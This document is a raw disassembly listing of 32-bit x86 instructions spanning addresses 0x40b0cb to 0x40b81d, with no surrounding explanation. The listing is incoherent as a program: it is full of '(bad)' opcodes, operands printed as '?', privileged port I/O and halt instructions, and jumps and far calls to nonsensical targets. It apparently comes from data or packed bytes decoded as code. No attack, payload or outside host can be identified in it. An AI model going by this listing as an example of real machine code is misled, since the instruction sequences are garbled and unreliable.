  40b0cb:	mov    ds:0xef5ecadc,eax
  40b0d0:	adc    DWORD PTR [ebx+0xe],esi
  40b0d3:	ret    
  40b0d4:	mov    fs,esp
  40b0d6:	adc    DWORD PTR [eax+0x44ab0826],edi
  40b0dc:	mov    ecx,0x781f045e
  40b0e1:	xchg   esp,eax
  40b0e2:	xchg   ebp,eax
  40b0e3:	xchg   edi,eax
  40b0e4:	cmp    eax,DWORD PTR [ebp+0x77dc4037]
  40b0ea:	(bad)  
  40b0eb:	dec    BYTE PTR [esi]
  40b0ed:	push   ds
  40b0ee:	pop    es
  40b0ef:	or     bl,BYTE PTR [esi-0x38]
  40b0f2:	mov    bh,0xc5
  40b0f4:	rcl    bh,cl
  40b0f6:	add    eax,0x6249a98e
  40b0fb:	adc    al,0x67
  40b0fd:	dec    ecx
  40b0fe:	ret    0x40b8
  40b101:	pop    ecx
  40b102:	fnstcw WORD PTR [ecx-0x2c]
  40b105:	push   ebx
  40b106:	loop   0x40b16c
  40b108:	(bad)  
  40b109:	fs jo  0x40b0b7
  40b10c:	xchg   eax,ebx
  40b10e:	mov    dl,0xc9
  40b110:	les    edi,FWORD PTR [edx+0x49]
  40b113:	and    DWORD PTR [ebx+0x6b551b96],0xffffffc8
  40b11a:	cmc    
  40b11b:	add    DWORD PTR [esi-0x19],ebx
  40b11e:	dec    eax
  40b11f:	mov    ch,0xbe
  40b121:	into   
  40b122:	retf   0x3261
  40b125:	shl    BYTE PTR [edx],1
  40b127:	(bad)  
  40b129:	lock icebp 
  40b12b:	jg     0x40b1aa
  40b12d:	ds pop edi
  40b12f:	jmp    0x40b0d1
  40b131:	scas   al,BYTE PTR es:[edi]
  40b132:	nop
  40b133:	aas    
  40b134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b135:	cmp    edx,DWORD PTR [ecx-0x4fb0f627]
  40b13b:	xor    ch,al
  40b13d:	dec    edi
  40b13e:	nop
  40b13f:	popa   
  40b140:	gs sbb al,0x4c
  40b143:	pusha  
  40b144:	mov    ebp,0x25802760
  40b149:	mov    edx,esp
  40b14b:	retf   0xa990
  40b14e:	out    0x76,eax
  40b150:	hlt    
  40b151:	shr    cl,0xd6
  40b154:	neg    BYTE PTR [esi+0x10]
  40b157:	xor    DWORD PTR [edi],0xffffffd7
  40b15a:	pop    ss
  40b15b:	das    
  40b15c:	cmp    BYTE PTR [eax+0x8],dl
  40b15f:	adc    ah,al
  40b161:	add    ebp,0x2e
  40b164:	out    0x38,al
  40b166:	push   0x2addb9ec
  40b16b:	mov    DWORD PTR [esi],edi
  40b16d:	dec    ebp
  40b16e:	fdivr  DWORD PTR [esi+0x1b]
  40b171:	cmp    dh,BYTE PTR [esi-0x7378d8bf]
  40b177:	push   0xff175d7b
  40b17c:	mov    dl,0x4b
  40b17e:	(bad)  
  40b17f:	sub    eax,0xf8adf77b
  40b184:	(bad)  
  40b185:	cmp    edx,DWORD PTR [edx]
  40b187:	cmc    
  40b188:	cmp    esp,esi
  40b18a:	pop    edi
  40b18b:	jns    0x40b1ee
  40b18d:	xchg   edi,eax
  40b18e:	and    BYTE PTR [edx-0x47],ah
  40b191:	push   esp
  40b192:	jno    0x40b1fb
  40b194:	fst    QWORD PTR [ecx+0x67a84e65]
  40b19a:	and    BYTE PTR [ebp+0x4e],ch
  40b19d:	mov    eax,ds:0x8ee2baef
  40b1a2:	retf   0xdd65
  40b1a5:	add    al,0x0
  40b1a7:	add    BYTE PTR [edx-0x2d],0x94
  40b1ab:	pop    ds
  40b1ac:	sub    dh,0xc2
  40b1af:	das    
  40b1b0:	add    al,0x44
  40b1b2:	loope  0x40b1b7
  40b1b4:	fld    QWORD PTR [esi+0x5839ee10]
  40b1ba:	inc    ebx
  40b1bb:	pushf  
  40b1bc:	mov    eax,ds:0xc18883d9
  40b1c1:	aam    0xd4
  40b1c3:	or     esi,esi
  40b1c5:	mov    al,0xcf
  40b1c7:	add    al,0xb5
  40b1c9:	test   DWORD PTR [ecx],ecx
  40b1cb:	mov    dh,0x1e
  40b1cd:	jmp    0xa9e8fef0
  40b1d2:	test   al,0x63
  40b1d4:	jae    0x40b20c
  40b1d6:	or     eax,0xd447da08
  40b1db:	pop    edx
  40b1dc:	mov    esi,0x8fadab9c
  40b1e1:	mov    WORD PTR [edi],ds
  40b1e3:	push   ecx
  40b1e4:	xchg   edx,eax
  40b1e5:	repz or BYTE PTR [edx+0x651edba2],0xc4
  40b1ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1ee:	cmc    
  40b1ef:	inc    ecx
  40b1f0:	ja     0x40b1d3
  40b1f2:	sub    BYTE PTR [eax],ch
  40b1f4:	jmp    0x39ec:0xcaff0c11
  40b1fb:	and    al,0xc2
  40b1fd:	call   0xd727fce2
  40b202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b203:	scas   eax,DWORD PTR es:[edi]
  40b204:	ret    
  40b205:	add    ebx,ebx
  40b207:	imul   edi,DWORD PTR [ecx-0x580fbe0],0xe
  40b20e:	xchg   esp,eax
  40b20f:	sub    edx,DWORD PTR [eax+0x3a567946]
  40b215:	pusha  
  40b216:	jmp    0x8d4e:0x35208e92
  40b21d:	adc    BYTE PTR [ebx+0x4d],0x3a
  40b221:	inc    ebp
  40b222:	pop    ds
  40b223:	xchg   esi,eax
  40b224:	es icebp 
  40b226:	adc    BYTE PTR [ebx-0x5f0afd03],0x93
  40b22d:	paddw  mm1,QWORD PTR [ebp+0x65]
  40b231:	mov    edx,0x3c26947b
  40b236:	push   ebp
  40b237:	push   ecx
  40b238:	mov    bl,0x3c
  40b23a:	pop    edx
  40b23b:	in     eax,0x17
  40b23d:	or     BYTE PTR [ebx],al
  40b23f:	cmp    al,0xde
  40b241:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b242:	nop
  40b243:	sub    BYTE PTR [edx-0x29e321a6],0x45
  40b24a:	mov    bl,0xa
  40b24c:	inc    ecx
  40b24d:	pop    ebx
  40b24e:	outs   dx,DWORD PTR ds:[esi]
  40b24f:	aas    
  40b250:	dec    esp
  40b251:	pop    ebp
  40b252:	es dec edi
  40b254:	dec    esi
  40b255:	xor    DWORD PTR [ebx+eiz*2+0x387ec085],edx
  40b25c:	inc    esp
  40b25d:	dec    esi
  40b25e:	imul   edx,DWORD PTR [esi+edx*8-0x3c864594],0x7d
  40b266:	dec    edi
  40b267:	jo     0x40b1fa
  40b269:	loop   0x40b1f7
  40b26b:	dec    edi
  40b26c:	mov    WORD PTR [ebx],?
  40b26e:	xchg   ebp,eax
  40b26f:	push   edi
  40b270:	shr    BYTE PTR [edi-0x7b2a15ce],0xfb
  40b277:	loop   0x40b256
  40b279:	inc    ebp
  40b27a:	lahf   
  40b27b:	mov    ds:0xd07719c7,al
  40b280:	push   esi
  40b281:	fmul   DWORD PTR [edx]
  40b283:	out    dx,al
  40b284:	std    
  40b285:	sub    edx,ebx
  40b287:	pop    esp
  40b288:	sbb    ch,BYTE PTR [edi-0x5e]
  40b28b:	out    0xe1,eax
  40b28d:	add    al,0xc1
  40b28f:	sar    ah,1
  40b291:	loop   0x40b276
  40b293:	adc    eax,0x62e7283
  40b298:	jns    0x40b252
  40b29a:	bound  esp,QWORD PTR ds:0xb85c3fcc
  40b2a0:	push   0xffffff8b
  40b2a2:	add    BYTE PTR [ecx],bh
  40b2a4:	adc    al,0xf9
  40b2a6:	jae    0x40b29c
  40b2a8:	cli    
  40b2a9:	fidiv  DWORD PTR [edx+ebx*1]
  40b2ac:	jno    0x40b247
  40b2ae:	in     al,dx
  40b2af:	push   ebx
  40b2b0:	adc    bl,BYTE PTR [ebp+esi*4-0x130ae9a1]
  40b2b7:	outs   dx,DWORD PTR ds:[esi]
  40b2b8:	push   es
  40b2b9:	adc    eax,0x79ba93a
  40b2be:	jae    0x40b2b9
  40b2c0:	sahf   
  40b2c1:	xchg   edi,eax
  40b2c2:	dec    esi
  40b2c3:	adc    BYTE PTR [edx+0x5975cd41],0xc7
  40b2ca:	inc    edi
  40b2cb:	ret    0x7694
  40b2ce:	jno    0x40b306
  40b2d0:	fsubr  QWORD PTR [edx+ebp*1]
  40b2d3:	imul   ecx,DWORD PTR [ebx+0x3f235a31],0xc3eaba7e
  40b2dd:	adc    bl,BYTE PTR [ecx+0x2c]
  40b2e0:	jne    0x40b323
  40b2e2:	jne    0x40b305
  40b2e4:	cld    
  40b2e5:	adc    ah,BYTE PTR [ecx]
  40b2e7:	dec    ebp
  40b2e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2e9:	pop    ebp
  40b2ea:	leave  
  40b2eb:	sub    eax,0x4c90e078
  40b2f0:	mov    WORD PTR [ecx+0x3d0510c9],ds
  40b2f6:	stos   DWORD PTR es:[edi],eax
  40b2f7:	ffree  st(0)
  40b2f9:	sbb    edx,edx
  40b2fb:	adc    cl,BYTE PTR [edi-0x7a]
  40b2fe:	test   al,0x35
  40b300:	mov    dl,0x6d
  40b302:	stos   BYTE PTR es:[edi],al
  40b303:	mov    bl,0x7b
  40b305:	shr    DWORD PTR [eax],cl
  40b307:	xchg   esp,eax
  40b308:	repz fcmovnu st,st(4)
  40b30c:	int3   
  40b30d:	aam    0x13
  40b30f:	xchg   esp,eax
  40b310:	push   ecx
  40b311:	int    0x8a
  40b313:	test   BYTE PTR [ebp+0x42],0xb8
  40b317:	jns    0x40b2e3
  40b319:	pop    ebp
  40b31a:	in     al,dx
  40b31b:	imul   esp,DWORD PTR [edx+edx*1-0x2138082e],0x2f
  40b323:	or     BYTE PTR [eax+0x45],al
  40b326:	push   eax
  40b327:	std    
  40b328:	stos   DWORD PTR es:[edi],eax
  40b329:	sbb    ebp,edi
  40b32b:	fist   DWORD PTR [edi]
  40b32d:	pop    ebx
  40b32e:	jmp    0x40b35d
  40b330:	xlat   BYTE PTR ds:[ebx]
  40b331:	call   0xbf86da28
  40b336:	jmp    0x2cd3:0x87eb6353
  40b33d:	jmp    0x8a69a0ce
  40b342:	scas   al,BYTE PTR es:[edi]
  40b343:	mov    edi,0x7d9c54de
  40b348:	leave  
  40b349:	mov    ch,BYTE PTR ds:0x811a79f8
  40b34f:	mov    ebx,0xaccb4cb5
  40b354:	jp     0x40b398
  40b356:	test   BYTE PTR [ebp+0x3ae48f9c],al
  40b35c:	pop    es
  40b35d:	jnp    0x40b376
  40b35f:	mov    cl,0x31
  40b361:	mov    ebx,0x144ada40
  40b366:	leave  
  40b367:	add    al,0x10
  40b369:	sub    al,0xd4
  40b36b:	add    eax,0xcdce7304
  40b370:	nop
  40b371:	in     al,dx
  40b372:	sti    
  40b373:	mov    ch,0xdd
  40b375:	lahf   
  40b376:	ds ds push es
  40b379:	pop    edi
  40b37a:	scas   eax,DWORD PTR es:[edi]
  40b37b:	mov    eax,0xf2826c2a
  40b380:	jmp    0xa0ade121
  40b385:	fisub  WORD PTR [ecx]
  40b387:	mov    edi,0xfb2e41af
  40b38c:	lods   al,BYTE PTR ds:[esi]
  40b38d:	test   al,0xba
  40b38f:	or     DWORD PTR [edi-0x57fe37e],eax
  40b395:	aas    
  40b396:	arpl   WORD PTR [esp+edx*4-0x2e],di
  40b39a:	push   ecx
  40b39b:	push   esp
  40b39c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b39d:	(bad)  
  40b39e:	adc    al,0xbe
  40b3a0:	sub    edx,esi
  40b3a2:	inc    edi
  40b3a3:	popa   
  40b3a4:	mov    ds:0x4cd2686f,al
  40b3a9:	es inc edi
  40b3ab:	xchg   edx,eax
  40b3ac:	lods   al,BYTE PTR ds:[esi]
  40b3ad:	adc    edx,DWORD PTR [ecx-0x5f]
  40b3b0:	(bad)  
  40b3b2:	pop    es
  40b3b3:	les    edi,FWORD PTR [ebx-0x10]
  40b3b6:	jno    0x40b3ad
  40b3b8:	or     ah,BYTE PTR [ebx]
  40b3ba:	aas    
  40b3bb:	pop    es
  40b3bc:	jl     0x40b3fd
  40b3be:	ins    DWORD PTR es:[edi],dx
  40b3bf:	inc    ebx
  40b3c0:	dec    edx
  40b3c1:	inc    ebx
  40b3c2:	imul   esi,DWORD PTR [esi+0x66],0xeeb89a1d
  40b3c9:	sub    BYTE PTR [edi-0x3f],cl
  40b3cc:	hlt    
  40b3cd:	push   ss
  40b3ce:	xchg   ebp,eax
  40b3cf:	fidiv  WORD PTR [edx]
  40b3d1:	push   edi
  40b3d2:	shr    BYTE PTR [ecx-0x19522839],0xfa
  40b3d9:	not    DWORD PTR [ebx]
  40b3db:	jns    0x40b3ef
  40b3dd:	add    DWORD PTR [edx+0x7d],eax
  40b3e0:	scas   eax,DWORD PTR es:[edi]
  40b3e1:	ror    dl,0x62
  40b3e4:	out    0xb7,al
  40b3e6:	mov    ds:0x21a4c18e,al
  40b3eb:	icebp  
  40b3ec:	leave  
  40b3ed:	lods   eax,DWORD PTR ds:[esi]
  40b3ee:	sub    al,0xd1
  40b3f0:	cdq    
  40b3f1:	jnp    0x40b3f9
  40b3f3:	xor    dh,BYTE PTR [edi+eiz*1-0x40]
  40b3f7:	dec    esi
  40b3f8:	jge    0x40b39b
  40b3fa:	and    BYTE PTR [ecx+eiz*4],bl
  40b3fd:	test   BYTE PTR [esi],al
  40b3ff:	pop    ds
  40b400:	cmp    esp,DWORD PTR [ecx+0x40]
  40b403:	pusha  
  40b404:	inc    esp
  40b405:	xchg   esi,eax
  40b406:	in     al,dx
  40b407:	cdq    
  40b408:	icebp  
  40b409:	imul   esp,ebp,0x7a
  40b40c:	enter  0x65fa,0x9f
  40b410:	mov    ebp,eax
  40b412:	popf   
  40b413:	xor    DWORD PTR [edi-0x733b8d33],ebx
  40b419:	mov    esp,0xc7e911ba
  40b41e:	adc    dl,BYTE PTR [edi-0x3014599f]
  40b424:	pop    eax
  40b425:	ss push cs
  40b427:	rcr    bh,0xd3
  40b42a:	sbb    DWORD PTR [esi-0x27],edx
  40b42d:	shl    BYTE PTR [ebp+0x5785c5e9],1
  40b433:	call   0x51b8:0xbf7da196
  40b43a:	jg     0x40b478
  40b43c:	pushf  
  40b43d:	adc    al,BYTE PTR [esi-0x6a3a51d7]
  40b443:	jo     0x40b426
  40b445:	pcmpeqw mm7,QWORD PTR [edi]
  40b448:	mov    ch,0x47
  40b44a:	mov    edx,eax
  40b44c:	jmp    0x40b449
  40b44e:	ins    BYTE PTR es:[edi],dx
  40b44f:	dec    edx
  40b450:	loope  0x40b481
  40b452:	pop    di
  40b454:	imul   esi,DWORD PTR [ecx+0xde391fb],0xa590618e
  40b45e:	rcl    BYTE PTR [ebp-0x628e6f7b],1
  40b464:	(bad)  
  40b465:	mov    WORD PTR ds:0x4ea48713,?
  40b46b:	jg     0x40b444
  40b46d:	(bad)  
  40b46e:	lock dec edi
  40b470:	fimul  WORD PTR [edi+0x61]
  40b473:	mov    cl,0xb9
  40b475:	sub    esp,edi
  40b477:	and    ah,BYTE PTR ds:0xdb0927c7
  40b47d:	xchg   ebp,eax
  40b47e:	cmp    eax,0xd601910d
  40b483:	add    al,0x1b
  40b485:	xchg   ebp,eax
  40b486:	ret    0x789e
  40b489:	fcmovu st,st(7)
  40b48b:	xor    ebx,DWORD PTR [edi+ecx*8+0x5cb9253d]
  40b492:	pop    esi
  40b493:	nop
  40b494:	jl     0x40b442
  40b496:	pop    esp
  40b497:	jne    0x40b41a
  40b499:	xor    eax,0x183ee4d8
  40b49e:	and    al,0x8e
  40b4a0:	dec    esi
  40b4a1:	test   al,0xff
  40b4a3:	pop    ss
  40b4a4:	jne    0x40b435
  40b4a6:	mov    edx,?
  40b4a8:	adc    edi,DWORD PTR [edx]
  40b4aa:	jno    0x40b49b
  40b4ac:	ss pop esi
  40b4ae:	push   0x19ad8eb3
  40b4b3:	fcom   QWORD PTR [edx+edx*2+0x17]
  40b4b7:	lahf   
  40b4b8:	xchg   BYTE PTR [edi+0x512f67e1],bh
  40b4be:	(bad)  
  40b4bf:	pop    ss
  40b4c0:	jl     0x40b504
  40b4c2:	lea    ebp,[edi-0x2]
  40b4c5:	cmpps  xmm4,xmm0,0x57
  40b4c9:	dec    eax
  40b4ca:	pop    ss
  40b4cb:	and    BYTE PTR [edi-0x73],dh
  40b4ce:	sbb    DWORD PTR [eax+0x7a52dd01],0xffffffb3
  40b4d5:	daa    
  40b4d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4d7:	or     DWORD PTR [esi+0xf2348ec],edx
  40b4dd:	int    0xdd
  40b4df:	mov    DWORD PTR [edi-0x4faf82f6],ecx
  40b4e5:	fs inc esi
  40b4e7:	mov    bl,0x6
  40b4e9:	scas   eax,DWORD PTR es:[edi]
  40b4ea:	pop    ebp
  40b4eb:	mov    eax,0x17c89604
  40b4f0:	or     ebx,DWORD PTR [ebx-0x32]
  40b4f3:	or     cl,BYTE PTR [ebx-0x29]
  40b4f6:	pop    edi
  40b4f7:	push   esp
  40b4f8:	xor    DWORD PTR [edx-0x44e6b673],edx
  40b4fe:	xor    BYTE PTR [eax-0x58],cl
  40b501:	mov    dh,0x3c
  40b503:	popa   
  40b504:	(bad)  
  40b505:	stos   DWORD PTR es:[edi],eax
  40b506:	add    BYTE PTR [ecx+0x2],al
  40b509:	fst    QWORD PTR [esi+0x5b491d44]
  40b50f:	sbb    ebp,esp
  40b511:	sbb    eax,0xb5546e73
  40b516:	xor    BYTE PTR [ebp-0x38],dh
  40b519:	xchg   ecx,eax
  40b51a:	idiv   DWORD PTR ds:[bx+si]
  40b51e:	adc    DWORD PTR [ebx],ebx
  40b520:	outs   dx,BYTE PTR ds:[esi]
  40b521:	retf   0xfa88
  40b524:	push   esi
  40b525:	cs test al,0x9d
  40b528:	les    esi,FWORD PTR [edx]
  40b52a:	cwde   
  40b52b:	jmp    0x47de:0xfeb6beff
  40b532:	adc    bl,BYTE PTR [ecx+0x5f]
  40b535:	jge    0x40b58e
  40b537:	jnp    0x40b4d0
  40b539:	push   es
  40b53a:	int3   
  40b53b:	fild   QWORD PTR ds:0xe303dc10
  40b541:	sbb    al,0x68
  40b543:	dec    eax
  40b544:	ins    DWORD PTR es:[edi],dx
  40b545:	pop    eax
  40b546:	xor    ebx,DWORD PTR ds:0xda9a1a20
  40b54c:	int3   
  40b54d:	imul   esp,esp,0xbb5b25ea
  40b553:	and    eax,0x6d7ff4c
  40b558:	jp     0x40b504
  40b55a:	gs jo  0x40b4e4
  40b55d:	mov    bh,0x21
  40b55f:	or     eax,0xea280e6c
  40b564:	ret    
  40b565:	scas   eax,DWORD PTR es:[edi]
  40b566:	xchg   edi,eax
  40b567:	into   
  40b568:	into   
  40b569:	and    eax,ecx
  40b56b:	lods   al,BYTE PTR es:[esi]
  40b56d:	push   edi
  40b56e:	xchg   edx,eax
  40b56f:	jno    0x40b5c3
  40b571:	dec    esp
  40b572:	rcl    DWORD PTR [ebx+eiz*2],cl
  40b575:	outs   dx,BYTE PTR ds:[esi]
  40b576:	fnstcw WORD PTR [ecx]
  40b578:	mov    ebp,0x311a1ea2
  40b57d:	inc    eax
  40b57e:	mov    cl,0xf
  40b580:	sbb    eax,0x948acbb4
  40b585:	sub    edx,DWORD PTR [edi]
  40b587:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b588:	mov    ah,0x15
  40b58a:	add    dh,bh
  40b58c:	jecxz  0x40b59b
  40b58e:	cld    
  40b58f:	ins    DWORD PTR es:[edi],dx
  40b590:	mov    bl,0x4d
  40b592:	mov    ecx,DWORD PTR [edx]
  40b594:	test   DWORD PTR [esi+0x691a2efe],eax
  40b59a:	(bad)  
  40b59b:	out    dx,al
  40b59c:	jg     0x40b5cd
  40b59e:	and    dh,BYTE PTR [ecx+ebp*1-0x1a357170]
  40b5a5:	loopne 0x40b533
  40b5a7:	clc    
  40b5a8:	gs jne 0x40b5f1
  40b5ab:	dec    ebx
  40b5ac:	mov    cl,0xfe
  40b5ae:	sbb    dl,ah
  40b5b0:	jp     0x40b555
  40b5b2:	fild   QWORD PTR [edx+0x321c6df8]
  40b5b8:	cs dec ecx
  40b5ba:	cmp    al,ch
  40b5bc:	lock push cs
  40b5be:	mov    edx,0x5fc2250b
  40b5c3:	fwait
  40b5c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5c5:	mov    ds:0xcf6588c,al
  40b5ca:	mov    BYTE PTR [eax-0x4cf29ec6],al
  40b5d0:	popa   
  40b5d1:	or     DWORD PTR [esi],ebp
  40b5d3:	and    eax,0x82d400b1
  40b5d8:	xchg   esp,eax
  40b5d9:	inc    ebx
  40b5da:	mov    ds:0x79007884,eax
  40b5df:	sti    
  40b5e0:	pop    ebx
  40b5e1:	cmp    bh,ah
  40b5e3:	ins    BYTE PTR es:[edi],dx
  40b5e4:	ins    DWORD PTR es:[edi],dx
  40b5e5:	jb     0x40b625
  40b5e7:	pop    eax
  40b5e8:	data16 mov dh,0x95
  40b5ec:	inc    ebp
  40b5ed:	add    eax,0x8615b1d8
  40b5f2:	lea    ebp,[esi-0x2134a1f8]
  40b5f8:	dec    ebx
  40b5f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5fa:	rcl    DWORD PTR [esi+0x91c8139],0x8c
  40b601:	aaa    
  40b602:	lods   eax,DWORD PTR ds:[esi]
  40b603:	ja     0x40b58c
  40b605:	call   0x5a14:0x23dcf7be
  40b60c:	imul   esi,esi,0x527e4763
  40b612:	jmp    0xcf10:0x66695ad2
  40b619:	pop    esp
  40b61a:	inc    ecx
  40b61b:	and    eax,0x4799fdf0
  40b620:	fwait
  40b621:	sbb    ch,BYTE PTR [ecx]
  40b623:	mov    ecx,0x714ba1ce
  40b628:	ret    
  40b629:	pop    edi
  40b62a:	rcl    DWORD PTR [ebp+ecx*2+0x3262b17a],cl
  40b631:	inc    esi
  40b632:	in     eax,0x6f
  40b634:	sar    DWORD PTR [eax-0x27],1
  40b637:	add    BYTE PTR [edx-0x61],dh
  40b63a:	sub    ebx,DWORD PTR [esi-0x3d62fb70]
  40b640:	or     BYTE PTR [esi+ebp*8+0x36fa2a9d],0x76
  40b648:	push   0x93bb409c
  40b64d:	xchg   ecx,eax
  40b64e:	push   0xefac3cc1
  40b653:	cdq    
  40b654:	in     eax,dx
  40b655:	xchg   edi,eax
  40b656:	jbe    0x40b5d9
  40b658:	mov    dh,cl
  40b65a:	cld    
  40b65b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b65c:	and    esi,DWORD PTR [edx-0x11ede092]
  40b662:	adc    eax,0x26ba2c7
  40b667:	iret   
  40b668:	test   al,0xe6
  40b66a:	sbb    DWORD PTR gs:[edx-0x6e],0xe56bb7bd
  40b672:	ins    DWORD PTR es:[edi],dx
  40b673:	inc    edx
  40b674:	mov    edx,0xab027b65
  40b679:	adc    BYTE PTR [ebx-0xa],0x4e
  40b67d:	push   edx
  40b67e:	mov    esp,0xa6bf744
  40b683:	pop    es
  40b684:	add    DWORD PTR [ebx+0x53c31117],eax
  40b68a:	jp     0x40b65d
  40b68c:	push   esp
  40b68d:	fs inc ebp
  40b68f:	repnz pop ecx
  40b691:	mov    edx,0x5fcfb59b
  40b696:	sub    BYTE PTR [edx+0x57a0087b],al
  40b69c:	jge    0x40b652
  40b69e:	pop    ebx
  40b69f:	ins    BYTE PTR es:[edi],dx
  40b6a0:	dec    ebx
  40b6a1:	xlat   BYTE PTR ds:[ebx]
  40b6a2:	dec    esp
  40b6a3:	ja     0x40b638
  40b6a5:	sbb    esi,esp
  40b6a7:	add    bh,dh
  40b6a9:	cmp    dl,BYTE PTR es:[ebp+0x425c39]
  40b6b0:	inc    eax
  40b6b1:	dec    edx
  40b6b2:	ffreep st(3)
  40b6b4:	in     al,dx
  40b6b5:	jne    0x40b6ad
  40b6b7:	pop    ebp
  40b6b8:	test   DWORD PTR [esi-0x5409aa27],esi
  40b6be:	mov    esp,0xe98cfea1
  40b6c3:	jmp    0x40b6a3
  40b6c5:	dec    esp
  40b6c6:	jecxz  0x40b683
  40b6c8:	inc    ebx
  40b6c9:	test   al,0x9f
  40b6cb:	sbb    al,0x9c
  40b6cd:	cli    
  40b6ce:	jmp    0x9c823468
  40b6d3:	scas   eax,DWORD PTR es:[edi]
  40b6d4:	adc    DWORD PTR [esi-0x6e],edx
  40b6d7:	loopne 0x40b681
  40b6d9:	mov    dl,0xb2
  40b6db:	lea    edi,[ebx-0x7e65e4a4]
  40b6e1:	inc    edi
  40b6e2:	retf   
  40b6e3:	gs out dx,al
  40b6e5:	hlt    
  40b6e6:	sbb    ebx,DWORD PTR [ecx-0x4a]
  40b6e9:	aaa    
  40b6ea:	xor    BYTE PTR [edx-0x4d628e49],bh
  40b6f0:	(bad)  
  40b6f1:	(bad)  
  40b6f2:	or     DWORD PTR [ebp-0x11],ecx
  40b6f5:	inc    eax
  40b6f6:	pop    eax
  40b6f7:	push   esi
  40b6f8:	mov    al,0xb5
  40b6fa:	jg     0x40b6f8
  40b6fc:	mov    BYTE PTR [edx],dl
  40b6fe:	loop   0x40b6a4
  40b700:	sti    
  40b701:	fdivp  st(4),st
  40b703:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b704:	and    al,0x8b
  40b706:	or     dh,cl
  40b708:	inc    edx
  40b709:	(bad)  
  40b70a:	out    dx,al
  40b70b:	(bad)
  40b70e:	les    ecx,FWORD PTR [esi-0x5f]
  40b711:	xlat   BYTE PTR ds:[ebx]
  40b712:	pop    ecx
  40b713:	mov    ch,0x74
  40b715:	inc    esp
  40b716:	in     eax,dx
  40b717:	cdq    
  40b718:	jae    0x40b70f
  40b71a:	jle    0x40b738
  40b71c:	cmp    eax,eax
  40b71e:	mov    ebp,esp
  40b720:	pop    edi
  40b721:	dec    ecx
  40b722:	inc    edx
  40b723:	retf   0x5e5c
  40b726:	dec    esp
  40b727:	xchg   ecx,eax
  40b728:	arpl   WORD PTR [esi-0x2402f56f],di
  40b72e:	push   cs
  40b72f:	push   esp
  40b730:	inc    ebp
  40b731:	mov    ebx,0xdbe3a782
  40b736:	sub    DWORD PTR [ecx+0x54200c28],ebx
  40b73c:	fiadd  WORD PTR [ebx+0x1c2b824c]
  40b742:	mov    dh,0xfa
  40b744:	sub    DWORD PTR [esi],ebp
  40b746:	push   esp
  40b747:	cmp    ch,BYTE PTR [ebp-0x54]
  40b74a:	dec    esi
  40b74b:	data16 aad 0x89
  40b74e:	test   eax,0xdcde9622
  40b753:	xchg   edi,eax
  40b754:	push   es
  40b755:	(bad)  
  40b756:	and    BYTE PTR [eax],dl
  40b758:	data16 or ch,BYTE PTR [ebp+0x250c411e]
  40b75f:	sub    bl,BYTE PTR [ebx+0x1e]
  40b762:	jmp    0x40b6e7
  40b764:	pushf  
  40b765:	loopne 0x40b7e4
  40b767:	arpl   WORD PTR [eax-0x33],sp
  40b76a:	push   es
  40b76b:	sub    DWORD PTR [ebp+0x5d],ecx
  40b76e:	or     bh,bh
  40b770:	xor    BYTE PTR [eax-0x13],ch
  40b773:	popf   
  40b774:	bound  ebp,QWORD PTR [edx]
  40b776:	add    eax,0x4a9aa824
  40b77b:	pop    eax
  40b77c:	ror    BYTE PTR [esi],1
  40b77e:	cmp    BYTE PTR [edx-0x7f],dl
  40b781:	or     ch,al
  40b783:	xchg   esp,eax
  40b784:	push   0xfffffffb
  40b786:	and    al,0x57
  40b788:	and    esp,DWORD PTR [edi]
  40b78a:	lahf   
  40b78b:	bound  ebx,QWORD PTR [edx+0x20]
  40b78e:	rol    BYTE PTR [ecx+0x19d1c13e],cl
  40b794:	call   0xff3f:0xb8b21177
  40b79b:	xor    eax,DWORD PTR [ebx+0x50fcc3d5]
  40b7a1:	cdq    
  40b7a2:	pop    esi
  40b7a3:	std    
  40b7a4:	iret   
  40b7a5:	mov    edx,0x4f4da503
  40b7aa:	and    al,0x43
  40b7ac:	sub    eax,0x40c3d40b
  40b7b1:	mov    WORD PTR [esi+0x3d92eb7a],?
  40b7b7:	adc    al,0xc9
  40b7b9:	jmp    0xf6b92568
  40b7be:	fbld   TBYTE PTR ds:[esi-0x4d]
  40b7c2:	mov    eax,0x17f2b86c
  40b7c7:	inc    eax
  40b7c8:	mov    BYTE PTR [edi-0x1],ch
  40b7cb:	push   cs
  40b7cc:	fwait
  40b7cd:	and    cl,BYTE PTR [edx]
  40b7cf:	and    cl,BYTE PTR [edi]
  40b7d1:	repz mov edi,0xefdcfc76
  40b7d7:	fdiv   QWORD PTR [eax-0x2831e5c5]
  40b7dd:	pop    ebx
  40b7de:	paddw  mm0,QWORD PTR [edi+0x199f8d40]
  40b7e5:	aad    0x3c
  40b7e7:	rol    al,cl
  40b7e9:	in     eax,dx
  40b7ea:	cli    
  40b7eb:	xchg   ecx,eax
  40b7ec:	ret    
  40b7ed:	xchg   ebp,eax
  40b7ee:	jns    0x40b814
  40b7f0:	xor    al,0x91
  40b7f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7f3:	scas   eax,DWORD PTR es:[edi]
  40b7f4:	push   0xe59947f
  40b7f9:	cli    
  40b7fa:	mov    ah,0xff
  40b7fc:	jle    0x40b7dc
  40b7fe:	or     eax,0x42f4d84b
  40b803:	dec    ecx
  40b804:	cs mov cl,0xee
  40b807:	ins    BYTE PTR es:[edi],dx
  40b808:	shr    edi,cl
  40b80a:	fdivrp st(6),st
  40b80c:	push   ebx
  40b80d:	jmp    0x40b864
  40b80f:	lods   eax,DWORD PTR ds:[esi]
  40b810:	add    al,0xaf
  40b813:	dec    ecx
  40b814:	jns    0x40b7d8
  40b816:	xor    eax,DWORD PTR [edx-0x17]
  40b819:	ror    DWORD PTR [edx],1
  40b81b:	ja     0x40b870
  40b81d:	or     eax,DWORD PTR [edi+0x60]
